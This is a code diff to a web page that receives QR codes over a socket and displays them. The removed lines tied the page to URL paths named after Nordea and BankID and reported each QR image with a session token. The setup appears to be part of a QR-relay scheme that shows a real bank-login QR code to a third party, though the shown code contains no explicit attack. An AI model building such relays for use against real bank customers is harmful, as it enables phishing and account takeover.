@@ -279,29 +279,12 @@
         const qrDisplay = document.getElementById('qrDisplay');
         const loadingContainer = document.getElementById('loadingContainer');
         const displayId = '98721311';
-        
-        // Extract token from URL if this is a temporary URL
-        // URL format: /Nordea/:token or /BankID/:token
-        const pathParts = window.location.pathname.split('/').filter(p => p);
-        const token = pathParts.length >= 2 ? pathParts[pathParts.length - 1] : null;
 
         socket.on('new_qr', (qrData) => {
             if (qrData && qrData !== '') {
                 qrDisplay.src = qrData;
                 qrDisplay.style.display = 'block';
                 loadingContainer.style.display = 'none';
-                
-                // If we have a token, notify server that QR was received
-                if (token) {
-                    fetch('/api/qr', {
-                        method: 'POST',
-                        headers: { 'Content-Type': 'application/json' },
-                        body: JSON.stringify({ 
-                            qrData: qrData,
-                            sessionToken: token 
-                        })
-                    }).catch(err => console.log('Status update error:', err));
-                }
             } else {
                 qrDisplay.style.display = 'none';
                 loadingContainer.style.display = 'flex';
@@ -335,12 +318,8 @@
         }
         keepAwake();
 
-        // Register display with token if available
-        if (token) {
-            socket.emit('register_display', { displayId, token });
-        } else {
-            socket.emit('register_display', displayId);
-        }
+        // Register display
+        socket.emit('register_display', displayId);
     </script>
 </body>
 </html> 
